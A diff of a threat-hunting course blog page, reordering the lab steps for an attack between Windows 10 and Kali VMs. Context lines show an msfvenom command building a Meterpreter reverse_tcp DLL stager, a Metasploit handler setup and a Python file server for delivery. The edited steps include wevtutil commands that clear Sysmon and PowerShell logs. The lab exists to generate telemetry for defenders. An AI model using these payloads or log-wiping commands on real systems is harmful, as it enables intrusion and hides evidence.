@@ -621,38 +621,37 @@ So though admittedly the previous sections is a somewhat shallow overview of the
 
 # 2.3. ATTACK!
 
-Finally! Let's get at it... 
+Finally! The time has come to give it our best shot... 
 
 {{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}
 
-1. First things first - fire up both your Windows 10 and Kali VMs.
+**Let's first set everything up.**
+1. Fire up both your Windows 10 and Kali VMs.
 2. On our Kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155** NOTE: Yours will be different!
 
-{{< figure src="/img/image032.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image032.png" title="" class="custom-figure-3" >}}
 
 3. Now go to the Windows VM. Open an administrative PowerShell terminal. Run `ipconfig` so we also have the ip of the victim - write this down. 
 
-{{< figure src="/img/image033.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image033.png" title="" class="custom-figure-3" >}}
 
 4. And now, though it's not really required, I just like to ping the Kali VM from this same terminal just to make sure the two VMs are connecting to one another on the local network. Obviously if this fails you will have to go back and troubleshoot.
 
-{{< figure src="/img/image034.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image034.png" title="" class="custom-figure-3" >}}
 
-5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the desktop, `New` > `Text document`, give it a name and add some generic content. 
+5. Next we'll create a simple text file on the victim's desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the desktop, `New` > `Text document`, give it a name and add some generic content. 
 
-{{< figure src="/img/image035.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image035.png" title="" class="custom-figure-3" >}}
 
-6. Next we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 
 
-7. And now finally, right before we start our attack I also want to clear both logs we activated - Sysmon and PowerShell ScriptBlock. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start a new so our final capture is undiluted. Open a PowerShell terminal as admin, and then run the following commands.
-```
-wevtutil cl "Microsoft-Windows-Sysmon/Operational”
-```
-```
-wevtutil cl "Microsoft-Windows-PowerShell/Operational"
-```
 
-{{< figure src="/img/image036.png" title="" class="custom-figure" >}}
+
+
+
+
+
+
+
 
 Great now that everything is setup let's generate our stager and transfer it over to the victim. 
 1. On our Kali VM open your terminal.
@@ -668,7 +667,7 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.230.155 Lport=88 
 
 {{< figure src="/img/image037.png" title="" class="custom-figure" >}}
 
-3. Next we want to tranfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else
+3. Next we want to transfer our malicious DLL over to the victim. There are a myriad ways in which you can achieve this, so feel free to follow my example, or use any other technique you prefer. Still on our Kali VM navigate to the directory where you saved your payload, in my case this is on the desktop. We'll now create a very simply http server by running a single python command (see below). Again `8008` represents an arbitrary port, feel free to choose something else
 
 ```
 python3 -m http.server 8008
@@ -705,7 +704,7 @@ We can see there are 3 required parameters. The first one `EXITFUNC` is good as 
 
 8. We can now set these values with two commands:
 - `set LHOST 192.168.230.155` (Note: change IP to YOURS)
-- `set LPORT 88`
+- `set LPORT 88` 
 
 {{< figure src="/img/image045.png" title="" class="custom-figure" >}}
 
@@ -728,6 +727,33 @@ Usually in order to run this next attack we'll use a PowerShell command to downl
 The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).
 
 And thus, just so you are aware, we are going to download and inject into memory the script from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 
+
+
+
+
+
+everything is setup, so we are ready to run or first attack command. 
+
+
+
+6. Next we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 
+
+7. And now finally, right before we start our attack I also want to clear both logs we activated - Sysmon and PowerShell ScriptBlock. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start a new so our final capture is undiluted. Open a PowerShell terminal as admin, and then run the following commands.
+```
+wevtutil cl "Microsoft-Windows-Sysmon/Operational”
+```
+```
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+{{< figure src="/img/image036.png" title="" class="custom-figure" >}}
+
+
+
+
+
+
+
 
 1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
 
